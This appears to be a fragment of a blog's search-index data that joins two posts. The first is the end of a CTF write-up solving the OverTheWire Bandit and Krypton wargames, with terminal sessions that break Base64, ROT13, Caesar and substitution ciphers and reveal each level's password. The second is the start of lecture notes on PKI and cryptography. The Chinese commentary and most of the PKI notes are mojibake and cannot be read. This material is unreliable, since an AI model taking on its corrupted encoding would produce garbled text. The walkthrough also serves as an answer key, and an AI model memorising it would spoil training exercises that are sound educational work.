binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay! bandit33@bandit:~$ls README.txt bandit33@bandit:~$cat README.txt Congratulations on solving the last level of this game! At this moment, there are no more levels to play in this game. However, we are constantly working on new levels and will most likely expand this game with more levels soon. Keep an eye out for an announcement on our usual communication channels! In the meantime, you could play some of our other wargames. If you have an idea for an awesome new level, please let us know! bandit33@bandit:~$  åªæœ‰ä¸€ä¸ªREADME.txtï¼Œæ­å–œå®Œç»“æ’’èŠ±\næˆªå›¾çºªå¿µä¸€ä¸‹\n ä»¥ä¸‹æ˜¯åé¢æ‰¾åˆ°çš„ä¸€äº›é¢˜è§£\nhttps://blog.csdn.net/winkar/article/details/38408873?locationNum=5\u0026fps=1\nhttps://www.freebuf.com/column/181443.html\nhttps://www.jianshu.com/p/bf8cc6b0efd1\n  Krypton  SSH Information Host: krypton.labs.overthewire.org Port: 2222\n level 0 Welcome to Krypton! The first level is easy. The following string encodes the password using Base64: S1JZUFRPTklTR1JFQVQ= Use this password to log in to krypton.labs.overthewire.org with username krypton1 using SSH on port 2222. You can find the files for other levels in /krypton/ å•Šè¿™ç†Ÿæ‚‰çš„å¼€å¤´ï¼Œç®€å•çš„base64ç¼–ç \nKRYPTONISGREAT è§£ç å¾—åˆ°å¦‚ä¸Šflag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  $ ssh krypton1@krypton.labs.overthewire.org -p 2222 The authenticity of host '[krypton.labs.overthewire.org]:2222 ([176.9.9.172]:2222)' can't be established. ECDSA key fingerprint is SHA256:SCySwNrZFEHArEX1cAlnnaJ5gz2O8VEigY9X80nFWUU. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added '[krypton.labs.overthewire.org]:2222,[176.9.9.172]:2222' (ECDSA) to the list of known hosts. _ _ | | ___ __ _ _ _ __ | |_ ___ _ __ | |/ / '__| | | | '_ \\| __/ _ \\| '_ \\ | \u003c| | | |_| | |_) | || (_) | | | | |_|\\_\\_| \\__, | .__/ \\__\\___/|_| |_| |___/|_| a http://www.overthewire.org wargame. krypton1@krypton.labs.overthewire.org's password: Permission denied, please try again. krypton1@krypton.labs.overthewire.org's password: Permission denied, please try again. krypton1@krypton.labs.overthewire.org's password: Welcome to Ubuntu 14.04 LTS (GNU/Linux 4.4.0-92-generic x86_64) * Documentation: https://help.ubuntu.com/ The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. krypton1@krypton:~$   æˆåŠŸè¿ä¸Šlevel1\nlevel 1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  krypton1@krypton:~$ ls -al total 24 drwxr-xr-x 3 krypton1 krypton1 4096 Feb 27 11:03 . drwxr-xr-x 10 root root 4096 Feb 27 11:03 .. -rw-r--r-- 1 krypton1 krypton1 220 Apr 9 2014 .bash_logout -rw-r--r-- 1 krypton1 krypton1 3637 Apr 9 2014 .bashrc drwx------ 2 krypton1 krypton1 4096 Feb 27 11:03 .cache -rw-r--r-- 1 krypton1 krypton1 675 Apr 9 2014 .profile krypton1@krypton:~$ cd /krypton/ krypton1@krypton:/krypton$ ls krypton1 krypton2 krypton3 krypton4 krypton5 krypton6 krypton1@krypton:/krypton$ ls krypton1 README krypton2 krypton1@krypton:/krypton$ cat krypton1/README Welcome to Krypton! This game is intended to give hands on experience with cryptography and cryptanalysis. The levels progress from classic ciphers, to modern, easy to harder. Although there are excellent public tools, like cryptool,to perform the simple analysis, we strongly encourage you to try and do these without them for now. We will use them in later excercises. ** Please try these levels without cryptool first ** The first level is easy. The password for level 2 is in the file 'krypton2'. It is 'encrypted' using a simple rotation called ROT13. It is also in non-standard ciphertext format. When using alpha characters for cipher text it is normal to group the letters into 5 letter clusters, regardless of word boundaries. This helps obfuscate any patterns. This file has kept the plain text word boundaries and carried them to the cipher text. Enjoy! krypton1@krypton:/krypton$ cat krypton1/krypton2 YRIRY GJB CNFFJBEQ EBGGRA krypton1@krypton:/krypton$   é€šè¿‡READMEå¯çŸ¥ï¼Œç®€å•çš„ROT13åŠ å¯†\nLEVEL TWO PASSWORD ROTTEN è¿›å…¥ä¸‹ä¸€å…³\nlevel 2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76  krypton2@krypton:~$ ls krypton2@krypton:~$ cd /krypton/ krypton2@krypton:/krypton$ cd krypton2 krypton2@krypton:/krypton/krypton2$ ls README encrypt keyfile.dat krypton3 krypton2@krypton:/krypton/krypton2$ cat README Krypton 2 ROT13 is a simple substitution cipher. Substitution ciphers are a simple replacement algorithm. In this example of a substitution cipher, we will explore a 'monoalphebetic' cipher. Monoalphebetic means, literally, \"one alphabet\" and you will see why. This level contains an old form of cipher called a 'Caesar Cipher'. A Caesar cipher shifts the alphabet by a set number. For example: plain: a b c d e f g h i j k ... cipher: G H I J K L M N O P Q ... In this example, the letter 'a' in plaintext is replaced by a 'G' in the ciphertext so, for example, the plaintext 'bad' becomes 'HGJ' in ciphertext. The password for level 3 is in the file krypton3. It is in 5 letter group ciphertext. It is encrypted with a Caesar Cipher. Without any further information, this cipher text may be difficult to break. You do not have direct access to the key, however you do have access to a program that will encrypt anything you wish to give it using the key. If you think logically, this is completely easy. One shot can solve it! Have fun. Additional Information: The `encrypt` binary will look for the keyfile in your current working directory. Therefore, it might be best to create a working direcory in /tmp and in there a link to the keyfile. As the `encrypt` binary runs setuid `krypton3`, you also need to give `krypton3` access to your working directory. Here is an example: krypton2@melinda:~$ mktemp -d /tmp/tmp.Wf2OnCpCDQ krypton2@melinda:~$ cd /tmp/tmp.Wf2OnCpCDQ krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ln -s /krypton/krypton2/keyfile.dat krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls keyfile.dat krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ chmod 777 . krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ /krypton/krypton2/encrypt /etc/issue krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls ciphertext keyfile.dat krypton2@krypton:/krypton/krypton2$ krypton2@krypton:/krypton/krypton2$ mktemp -d /tmp/tmp.fz9I1hQd5d krypton2@krypton:/krypton/krypton2$ cd /tmp/tmp.fz9I1hQd5d krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ln -s /krypton/krypton2/keyfile.dat krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls keyfile.dat krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ chmod 777 . krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ /krypton/krypton2/encrypt /etc/issue krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls ciphertext keyfile.dat krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ cat ciphertext GNGZFGXFEZX krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ cat keyfile.dat cat: keyfile.dat: Permission denied krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls -al total 12 drwxrwxrwx 2 krypton2 krypton2 4096 Feb 27 11:19 . drwxrwx-wt 3 root root 4096 Feb 27 11:20 .. -rw-rw-r-- 1 krypton3 krypton2 11 Feb 27 11:19 ciphertext lrwxrwxrwx 1 krypton2 krypton2 29 Feb 27 11:18 keyfile.dat -\u003e /krypton/krypton2/keyfile.dat krypton2@krypton:/tmp/tmp.fz9I1hQd5d$   å°†å¯†æ–‡GNGZFGXFEZXè¿›è¡Œå‡¯æ’’ä½ç§»\nHOHAGHYGFAY IPIBHIZHGBZ JQJCIJAIHCA KRKDJKBJIDB LSLEKLCKJEC MTMFLMDLKFD NUNGMNEMLGE OVOHNOFNMHF PWPIOPGONIG QXQJPQHPOJH RYRKQRIQPKI SZSLRSJRQLJ TATMSTKSRMK UBUNTULTSNL VCVOUVMUTOM WDWPVWNVUPN XEXQWXOWVQO YFYRXYPXWRP ZGZSYZQYXSQ AHATZARZYTR BIBUABSAZUS CJCVBCTBAVT DKDWCDUCBWU ELEXDEVDCXV FMFYEFWEDYW GNGZFGXFEZX å‘ç°æœç„¶å¥½åƒæ²¡æœ‰å¯è¯»çš„ï¼Œå†çœ‹çœ‹READMEåŸæ¥è¿™æ˜¯ä¸ªç¤ºä¾‹ï¼ˆæˆ‘å¥½è ¢\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ cat /etc/issue Ubuntu 14.04.5 LTS \\n \\l krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls /krypton/krypton2/krypton3 /krypton/krypton2/krypton3 krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls /krypton/krypton2/ -al total 32 drwxr-xr-x 2 root root 4096 Nov 4 05:21 . drwxr-xr-x 8 root root 4096 Nov 4 05:21 .. -rw-r----- 1 krypton2 krypton2 1815 Nov 4 05:21 README -rwsr-x--- 1 krypton3 krypton2 8970 Nov 4 05:21 encrypt -rw-r----- 1 krypton3 krypton3 27 Nov 4 05:21 keyfile.dat -rw-r----- 1 krypton2 krypton2 13 Nov 4 05:21 krypton3 krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls ciphertext keyfile.dat krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ rm -f ciphertext krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ /krypton/krypton2/encrypt /krypton/krypton2/krypton3 krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls ciphertext keyfile.dat krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ cat ciphertext AYCQYPGQCYQW krypton2@krypton:/tmp/tmp.fz9I1hQd5d$   é‡æ–°ç”¨krypton3è¢«åŠ è½½ï¼Œè§£å¯†ï¼Œå¾—åˆ°CAESARISEASY\nBZDRZQHRDZRX CAESARISEASY DBFTBSJTFBTZ ECGUCTKUGCUA FDHVDULVHDVB GEIWEVMWIEWC HFJXFWNXJFXD IGKYGXOYKGYE JHLZHYPZLHZF KIMAIZQAMIAG LJNBJARBNJBH MKOCKBSCOKCI NLPDLCTDPLDJ OMQEMDUEQMEK PNRFNEVFRNFL QOSGOFWGSOGM RPTHPGXHTPHN SQUIQHYIUQIO TRVJRIZJVRJP USWKSJAKWSKQ VTXLTKBLXTLR WUYMULCMYUMS XVZNVMDNZVNT YWAOWNEOAWOU ZXBPXOFPBXPV AYCQYPGQCYQW å¾—åˆ°flagè¿›å…¥ä¸‹ä¸€å…³\nlevel 3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  krypton3@krypton:~$ ls krypton3@krypton:~$ cd /krypton/krypton3 krypton3@krypton:/krypton/krypton3$ ls HINT1 HINT2 README found1 found2 found3 krypton4 krypton3@krypton:/krypton/krypton3$ cat README Well done. You've moved past an easy substitution cipher. Hopefully you just encrypted the alphabet a plaintext to fully expose the key in one swoop. The main weakness of a simple substitution cipher is repeated use of a simple key. In the previous exercise you were able to introduce arbitrary plaintext to expose the key. In this example, the cipher mechanism is not available to you, the attacker. However, you have been lucky. You have intercepted more than one message. The password to the next level is found in the file 'krypton4'. You have also found 3 other files. (found1, found2, found3) You know the following important details: - The message plaintexts are in English (*** very important) - They were produced from the same key (*** even better!) Enjoy. krypton3@krypton:/krypton/krypton3$ cat found1 CGZNL YJBEN QYDLQ ZQSUQ NZCYD SNQVU BFGBK GQUQZ QSUQN UZCYD SNJDS UDCXJ ZCYDS NZQSU QNUZB WSBNZ QSUQN UDCXJ CUBGS BXJDS UCTYV SUJQG WTBUJ KCWSV LFGBK GSGZN LYJCB GJSZD GCHMS UCJCU QJLYS BXUMA UJCJM JCBGZ CYDSN CGKDC ZDSQZ DVSJJ SNCGJ DSYVQ CGJSO JCUNS YVQZS WALQV SJJSN UBTSX COSWG MTASN BXYBU CJCBG UWBKG JDSQV YDQAS JXBNS OQTYV SKCJD QUDCX JBXQK BMVWA SNSYV QZSWA LWAKB MVWAS ZBTSS QGWUB BGJDS TSJDB WCUGQ TSWQX JSNRM VCMUZ QSUQN KDBMU SWCJJ BZBTT MGCZQ JSKCJ DDCUE SGSNQ VUJDS SGZNL YJCBG UJSYY SNXBN TSWAL QZQSU QNZCY DSNCU BXJSG CGZBN YBNQJ SWQUY QNJBX TBNSZ BTYVS OUZDS TSUUM ZDQUJ DSICE SGNSZ CYDSN QGWUJ CVVDQ UTBWS NGQYY VCZQJ CBGCG JDSNB JULUJ STQUK CJDQV VUCGE VSQVY DQASJ UMAUJ CJMJC BGZCY DSNUJ DSZQS UQNZC YDSNC USQUC VLANB FSGQG WCGYN QZJCZ SBXXS NUSUU SGJCQ VVLGB ZBTTM GCZQJ CBGUS ZMNCJ LUDQF SUYSQ NSYNB WMZSW TBUJB XDCUF GBKGK BNFAS JKSSG QGWDC USQNV LYVQL UKSNS TQCGV LZBTS WCSUQ GWDCU JBNCS UESGN SUDSN QCUSW JBJDS YSQFB XUBYD CUJCZ QJCBG QGWQN JCUJN LALJD SSGWB XJDSU COJSS GJDZS GJMNL GSOJD SKNBJ STQCG VLJNQ ESWCS UMGJC VQABM JCGZV MWCGE DQTVS JFCGE VSQNQ GWTQZ ASJDZ BGUCW SNSWU BTSBX JDSXC GSUJS OQTYV SUCGJ DSSGE VCUDV QGEMQ ESCGD CUVQU JYDQU SDSKN BJSJN QECZB TSWCS UQVUB FGBKG QUNBT QGZSU QGWZB VVQAB NQJSW KCJDB JDSNY VQLKN CEDJU TQGLB XDCUY VQLUK SNSYM AVCUD SWCGS WCJCB GUBXI QNLCG EHMQV CJLQG WQZZM NQZLW MNCGE DCUVC XSJCT SQGWC GJKBB XDCUX BNTSN JDSQJ NCZQV ZBVVS QEMSU YMAVC UDSWJ DSXCN UJXBV CBQZB VVSZJ SWSWC JCBGB XDCUW NQTQJ CZKBN FUJDQ JCGZV MWSWQ VVAMJ JKBBX JDSYV QLUGB KNSZB EGCUS WQUUD QFSUY SQNSU krypton3@krypton:/krypton/krypton3$ cat found2 QVJDB MEDGB QJJSG WQGZS NSZBN WUXBN JDSYS NCBWU MNICI STBUJ ACBEN QYDSN UQENS SJDQJ UDQFS UYSQN SKQUS WMZQJ SWQJJ DSFCG EUGSK UZDBB VCGUJ NQJXB NWQXN SSUZD BBVZD QNJSN SWCGQ ABMJQ HMQNJ SNBXQ TCVSX NBTDC UDBTS ENQTT QNUZD BBVUI QNCSW CGHMQ VCJLW MNCGE JDSSV CPQAS JDQGS NQAMJ JDSZM NNCZM VMTKQ UWCZJ QJSWA LVQKJ DNBME DBMJS GEVQG WQGWJ DSUZD BBVKB MVWDQ ISYNB ICWSW QGCGJ SGUCI SSWMZ QJCBG CGVQJ CGENQ TTQNQ GWJDS ZVQUU CZUQJ JDSQE SBXUD QFSUY SQNST QNNCS WJDSL SQNBV WQGGS DQJDQ KQLJD SZBGU CUJBN LZBMN JBXJD SWCBZ SUSBX KBNZS UJSNC UUMSW QTQNN CQESV CZSGZ SBGGB ISTAS NJKBB XDQJD QKQLU GSCED ABMNU YBUJS WABGW UJDSG SOJWQ LQUUM NSJLJ DQJJD SNSKS NSGBC TYSWC TSGJU JBJDS TQNNC QESJD SZBMY VSTQL DQISQ NNQGE SWJDS ZSNST BGLCG UBTSD QUJSU CGZSJ DSKBN ZSUJS NZDQG ZSVVB NQVVB KSWJD STQNN CQESA QGGUJ BASNS QWBGZ SCGUJ SQWBX JDSMU MQVJD NSSJC TSUQG GSUYN SEGQG ZLZBM VWDQI SASSG JDSNS QUBGX BNJDC UUCOT BGJDU QXJSN JDSTQ NNCQE SUDSE QISAC NJDJB QWQME DJSNU MUQGG QKDBK QUAQY JCUSW BGTQL JKCGU UBGDQ TGSJQ GWWQM EDJSN RMWCJ DXBVV BKSWQ VTBUJ JKBLS QNUVQ JSNQG WKSNS AQYJC USWBG XSANM QNLDQ TGSJW CSWBX MGFGB KGZQM USUQJ JDSQE SBXQG WKQUA MNCSW BGQME MUJQX JSNJD SACNJ DBXJD SJKCG UJDSN SQNSX SKDCU JBNCZ QVJNQ ZSUBX UDQFS UYSQN SMGJC VDSCU TSGJC BGSWQ UYQNJ BXJDS VBGWB GJDSQ JNSUZ SGSCG ASZQM USBXJ DCUEQ YUZDB VQNUN SXSNJ BJDSL SQNUA SJKSS GQGWQ UUDQF SUYSQ NSUVB UJLSQ NUACB ENQYD SNUQJ JSTYJ CGEJB QZZBM GJXBN JDCUY SNCBW DQISN SYBNJ SWTQG LQYBZ NLYDQ VUJBN CSUGC ZDBVQ UNBKS UDQFS UYSQN SUXCN UJACB ENQYD SNNSZ BMGJS WQUJN QJXBN WVSES GWJDQ JUDQF SUYSQ NSXVS WJDSJ BKGXB NVBGW BGJBS UZQYS YNBUS ZMJCB GXBNW SSNYB QZDCG EQGBJ DSNSC EDJSS GJDZS GJMNL UJBNL DQUUD QFSUY SQNSU JQNJC GEDCU JDSQJ NCZQV ZQNSS NTCGW CGEJD SDBNU SUBXJ DSQJN SYQJN BGUCG VBGWB GRBDG QMANS LNSYB NJSWJ DQJUD QFSUY SQNSD QWASS GQZBM GJNLU ZDBBV TQUJS NUBTS JKSGJ CSJDZ SGJMN LUZDB VQNUD QISUM EESUJ SWJDQ JUDQF SUYSQ NSTQL DQISA SSGST YVBLS WQUQU ZDBBV TQUJS NALQV SOQGW SNDBE DJBGB XVQGZ QUDCN SQZQJ DBVCZ VQGWB KGSNK DBGQT SWQZS NJQCG KCVVC QTUDQ FSUDQ XJSCG DCUKC VVGBS ICWSG ZSUMA UJQGJ CQJSU UMZDU JBNCS UBJDS NJDQG DSQNU QLZBV VSZJS WQXJS NDCUW SQJD krypton3@krypton:/krypton/krypton3$ cat found3 DSNSM YBGVS ENQGW QNBUS KCJDQ ENQIS QGWUJ QJSVL QCNQG WANBM EDJTS JDSAS SJVSX NBTQE VQUUZ QUSCG KDCZD CJKQU SGZVB USWCJ KQUQA SQMJC XMVUZ QNQAQ SMUQG WQJJD QJJCT SMGFG BKGJB GQJMN QVCUJ UBXZB MNUSQ ENSQJ YNCPS CGQUZ CSGJC XCZYB CGJBX ICSKJ DSNSK SNSJK BNBMG WAVQZ FUYBJ UGSQN BGSSO JNSTC JLBXJ DSAQZ FQGWQ VBGEB GSGSQ NJDSB JDSNJ DSUZQ VSUKS NSSOZ SSWCG EVLDQ NWQGW EVBUU LKCJD QVVJD SQYYS QNQGZ SBXAM NGCUD SWEBV WJDSK SCEDJ BXJDS CGUSZ JKQUI SNLNS TQNFQ AVSQG WJQFC GEQVV JDCGE UCGJB ZBGUC WSNQJ CBGCZ BMVWD QNWVL AVQTS RMYCJ SNXBN DCUBY CGCBG NSUYS ZJCGE CJ krypton3@krypton:/krypton/krypton3$ cat HINT1 Some letters are more prevalent in English than others. krypton3@krypton:/krypton/krypton3$ cat HINT2 \"Frequency Analysis\" is your friend. krypton3@krypton:/krypton/krypton3$ krypton3@krypton:/krypton/krypton3$    https://www.jianshu.com/p/a131136c0dbf\n # 25char 257: (space) 155: S 107: C 106: Q 102: J 100: U 87: B 81: G 74: N 69: D 57: Z 56: V 47: W 42: Y 32: T 29: X 29: M 27: L 25: K 20: A 17: E 11: F 7: O 2: I 2: H 1: R # 26char 354: (space) 243: S 186: Q 158: J 135: N 130: U 129: B 119: D 111: G 86: C 66: W 59: Z 53: V 45: M 37: T 34: E 33: Y 33: X 30: K 27: L 26: A 14: I 12: F 3: O 2: R 2: H 1: P # 25char 93: (space) 58: S 48: Q 41: J 35: G 34: C 31: N 30: B 27: U 22: D 21: V 16: Z 16: W 13: E 12: M 12: K 9: Y 9: X 9: A 6: T 6: L 5: F 3: I 2: O 1: R 1: P å‡å¦‚æŠŠæ‰€æœ‰ç»¼åˆä¸€èµ·ç»Ÿè®¡\n703: (space) 456: S:e 340: Q:t 301: J:a 257: U:o 246: B:i 240: N:n 227: G:s 227: C:h 210: D:r 132: Z:d 130: V:l 129: W:c 86: M:u 84: Y:m 75: T:w 71: X:f 67: K:g 64: E:y 60: L:p 55: A:b 28: F:v 19: I:k 12: O:j 4: R:x 4: H:q 2: P:z æŠŠä¸Šè¿°è¯é¢‘å¸¦å…¥è§£å¼€ï¼Œè²Œä¼¼ä¹Ÿä¸æ˜¯å¯†ç å•Š\n1 2 3  krypton3@krypton:/krypton/krypton3$ cat krypton4 KSVVW BGSJD SVSIS VXBMN YQUUK BNWCU ANMJS gellc isear eleke lfiun mtoog incho bnuae    http://www.richkni.co.uk/php/crypta/freq.php\nhttp://www.simonsingh.net/The_Black_Chamber/hintsandtips.html\n æˆ‘ç–¯äº†ï¼Œåšæ³•æ²¡é—®é¢˜ï¼Œä½†æ®è¯´åªèƒ½ä¸€ä¸ªä¸ªè¯•ï¼Œç›´æ¥æ‰¾åˆ°äº†é¢˜è§£\nsecret: A B C D E F G H I J K L M N O P Q R S T U V W X Y Z text: B O I H G K N Q V T W Y U R X Z A J E M S L D F P C ç”¨å‘½ä»¤æ›¿æ¢å¾—åˆ°å¯†ç \n1  $ cat krypton4 | tr '[A-Z]' '[BOIHGKNQVTWYURXZAJEMSLDFPC]'   1 2 3  krypton3@krypton:/krypton/krypton3$ cat krypton4 | tr '[A-Z]' '[BOIHGKNQVTWYURXZAJEMSLDFPC]' WELLD ONETH ELEVE LFOUR PASSW ORDIS BRUTE krypton3@krypton:/krypton/krypton3$   ","description":"","tags":["ctf","wargame"],"title":"CTF-Wargame","uri":"/posts/ctf-wargame/"},{"categories":["crypto"],"content":"Security Protocols and Standards\n--PKI Principles and technology\n å®‰å…¨åè®®ä¸æ ‡å‡† * PKI concepts/content/significance * Core PKI Service * Certificate and CRL(è¯ä¹¦åŠé”€åˆ—è¡¨) * Trust Model * PKCSï¼šThe Public-Key Cryptography Standards * CA(è¯ä¹¦è®¤è¯ä¸­å¿ƒï¼šCertificate Authority) Standards * PKI Security Protocolsï¼šSMIMEï¼ŒSSLï¼ŒSET(å®‰å…¨ç”µå­äº¤æ˜“åè®®)ï¼ŒVPN * PKI/CA Design and Implementation * Related Laws * \\* Bitcoin \u0026 BlockChain 1.Review to Cryptography  Security Requirment(å®‰å…¨éœ€æ±‚)  Confidentiality(æœºå¯†æ€§)ï¼šé˜²æ­¢è¢«æœªæˆæƒäººå‘˜è¯»å–ä¿¡æ¯ Integrity(å®Œæ•´æ€§)ï¼šä¿æŒæ•°æ®ä¸€è‡´å®Œæ•´ Availability(å¯ç”¨æ€§)ï¼šä¿æŒæ•°æ®å¯ç”¨ Authentication(è®¤è¯æ€§)ï¼šä¿è¯äººçš„èº«ä»½æ­£ç¡® Non-repudiation(æŠ—æŠµèµ–æ€§)ï¼šç¡®ä¿æ•°æ®ä¸ä¼šè¢«å¦å®š Access control(è®¿é—®æ§åˆ¶)ï¼šé˜²æ­¢æœªæˆæƒäººå‘˜è®¿é—®  å‰ä¸‰ä¸ªè¢«ç§°ä¸ºä¿¡æ¯å®‰å…¨çš„CIAä¸‰è¦ç´ \n æ”»å‡»çš„ç±»å‹ æ”»å‡»åˆ†ä¸ºä¸¤ç§ç±»å‹ï¼šä¸»åŠ¨æ”»å‡»å’Œè¢«åŠ¨æ”»å‡»\n è¢«åŠ¨æ”»å‡»(Passive attack)ï¼šåªèƒ½è§‚å¯Ÿåˆ°æµé‡æˆ–æ•°æ® ä¸»åŠ¨æ”»å‡»(Active attack)ï¼šå¯ä»¥ä¸»åŠ¨ä¿®æ”¹æµé‡æˆ–æ•°æ®ï¼Œæ¯”å¦‚ä¸­é—´äººæ”»å‡»ã€‚é€šå¸¸æ¯”è¾ƒéš¾å®ç°ï¼Œä½†æ˜¯æ”»å‡»ååˆ†æœ‰æ•ˆï¼Œæ¯”å¦‚é‚®ä»¶çš„ä¼ªé€ ï¼ŒTCP/IP spoofingï¼ˆIPæ¬ºéª—ï¼‰ï¼Œsession hijackingï¼ˆä¼šè¯åŠ«æŒï¼‰  å®‰å…¨æœåŠ¡ ISO7498-2ä¸­å®šä¹‰äº†5å¤§ç±»å¯é€‰çš„å®‰å…¨æœåŠ¡ï¼š\n è®¤è¯æ€§ è®¿é—®æ§åˆ¶ æ•°æ®ä¿å¯†æ€§ æ•°æ®å®Œæ•´æ€§ ä¸å¯å¦è®¤æ€§  å®‰å…¨æœºåˆ¶ ä¸‰å¤§åŸºæœ¬è®¾æ–½\n Encryption(åŠ å¯†) Digital signatures(æ•°å­—ç­¾å) Checksums/hash algorithm(æ ¡éªŒç /å“ˆå¸Œç®—æ³•)  ä¸€ç§å®‰å…¨æœåŠ¡å¯èƒ½ç»“åˆå¤šç§å®‰å…¨æœºåˆ¶\nSecurity Protocol ä¸€ç§å®‰å…¨åè®®é‡ŒåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªå®‰å…¨æœåŠ¡ï¼Œè€Œå®‰å…¨æœåŠ¡æä¾›å¤šç§å®‰å…¨æœºåˆ¶ï¼Œåœ¨ä¸€ä¸ªå®‰å…¨æœºåˆ¶é‡Œå¯èƒ½ç”¨åˆ°å¤šç§ç®—æ³•ï¼ˆæœºåˆ¶ç”±ç®—æ³•å®ç°ï¼‰ï¼Œè¿™å°±æ˜¯åè®®ä¸æœåŠ¡ã€æœºåˆ¶ã€ç®—æ³•ä¹‹é—´çš„å…³ç³»\nå¯¹ç§°åŠ å¯†ç”±åŠ å¯†è¿‡ç¨‹å¯åˆ†ä¸ºï¼šæµåŠ å¯†(Stream cipher)å’Œå—åŠ å¯†(Block cipher)\nKey Distribution Center(KDC)ï¼šå¯†é’¥åˆ†å‘ä¸­å¿ƒ\nå—åŠ å¯†æ–¹å¼  Electronic Code Book(ECB) Cipher Block Chain(CBC) Cipher Feed Back(CFB) Output Feed Back(OFB) Counter(CTR)  å…¬é’¥åº”ç”¨  åŠ è§£å¯† æ•°å­—ç­¾å å¯†é’¥äº¤æ¢  ç®—æ³•  RSA DHï¼škey exchange algorithm Elgamal DSA  å¯¹ç§°åŠ å¯†vséå¯¹ç§°åŠ å¯† å¯¹ç§°åŠ å¯†  ä¼˜ç‚¹  é€Ÿåº¦å¿«ã€å¤„ç†é‡å¤§ï¼Œé€‚ç”¨äºå¯¹åº”ç”¨æ•°æ®çš„ç›´æ¥åŠ å¯† åŠ å¯†å¯†é’¥é•¿åº¦çŸ­ï¼Œä¸€èˆ¬ä¸º40bitè‡³128bit è¿˜å¯ä»¥æ„é€ å„ç§åŠ å¯†ä½“åˆ¶ï¼Œå¦‚äº§ç”Ÿä¼ªéšæœºæ•°ã€hashå‡½æ•°   ç¼ºç‚¹  å¯†é’¥åœ¨åŒæ–¹éƒ½è¦ä¸€è‡´ã€ä¿å¯†ï¼Œä¼ é€’è¾ƒéš¾ å¤§å‹ç½‘ç»œä¸­å¯†é’¥é‡å¤§ï¼Œéš¾ä»¥ç®¡ç†ï¼Œä¸€èˆ¬éœ€è¦TTP å¯†é’¥éœ€è¦ç»å¸¸æ›´æ¢    éå¯¹ç§°åŠ å¯†  ä¼˜ç‚¹  åªæœ‰ç§é’¥ä¿å¯†ï¼Œå…¬é’¥å…¬å¼€ ç½‘ç»œä¸Šçš„å¯†é’¥ç®¡ç†åªéœ€è¦ä¸€ä¸ªåŠŸèƒ½æ€§TTPï¼Œè€Œä¸æ˜¯ä¸€ä¸ªç»å¯¹å®‰å…¨çš„TTPï¼Œä¸éœ€åœ¨çº¿ï¼Œå¯ä»¥ç¦»çº¿ å¯†é’¥ç”Ÿå‘½å‘¨æœŸç›¸å¯¹è¾ƒé•¿ è®¸å¤šå…¬é’¥æ–¹æ¡ˆå¯ä»¥äº§ç”Ÿæ•°å­—ç­¾åæœºåˆ¶ åœ¨å¤§å‹ç½‘ç»œä¸Šï¼Œæ‰€éœ€çš„å¯†é’¥ç›¸å¯¹è¾ƒå°‘   ç¼ºç‚¹  é€Ÿåº¦æ…¢ã€å¤„ç†é‡å°‘ï¼Œé€‚ç”¨äºå¯†é’¥äº¤æ¢ å¯†é’¥é•¿åº¦ç›¸å¯¹è¾ƒé•¿ å®‰å…¨æ€§æ²¡æœ‰å¾—åˆ°ç†è®ºæ€§è¯æ˜ å†å²è¾ƒçŸ­    å“ˆå¸Œå‡½æ•° å¼±ç¢°æ’ï¼šç»™å®šxï¼Œå¯»æ‰¾yï¼Œä½¿å¾—H(y) = H(x)\nå¼ºç¢°æ’ï¼šå¯»æ‰¾xï¼Œyï¼Œä½¿å¾—H(y) = H(x)\nMessage Authertication Code(MAC) æ¶ˆæ¯è®¤è¯ç MAC\næ•°å­—ç­¾åï¼ˆDigital Signatureï¼‰ Key Management å¯†ç å­¦æœ€éš¾çš„éƒ¨åˆ†\nå¯†é’¥åˆ†ä¸ºä¸¤ç§\n Short-term session keys(ephemeral keys) Long-term keys  